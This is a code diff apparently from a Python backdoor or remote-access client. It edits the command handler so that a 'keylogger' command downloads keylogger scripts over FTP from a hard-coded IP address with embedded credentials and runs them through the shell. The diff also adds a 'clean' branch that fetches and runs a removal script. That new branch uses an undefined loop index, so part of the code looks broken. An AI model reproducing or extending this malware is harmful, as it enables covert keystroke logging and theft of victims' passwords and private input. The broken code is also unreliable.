@@ -8,6 +8,7 @@
 
 import socket
 import subprocess
+import os
 import sys
 
 from core import common, crypto, persistence, scan, survey, toolkit
@@ -59,12 +60,19 @@ def main():
             results = results.stdout.read() + results.stderr.read()
             
         elif cmd == 'keylogger':
-            action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'sh start_keylogger.sh']
-            for i in range(len(action)):
+            if action == 'clean':
+                action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/clean_keylogger.sh', 'sh clean_keylogger.sh']
                 results = subprocess.Popen(action[i], shell=True,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
                 results = results.stdout.read() + results.stderr.read()
+            else:
+                action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'sh start_keylogger.sh']
+                for i in range(len(action)):
+                    results = subprocess.Popen(action[i], shell=True,
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE)
+                    results = results.stdout.read() + results.stderr.read()
 
         elif cmd == 'kill':
             conn.close()
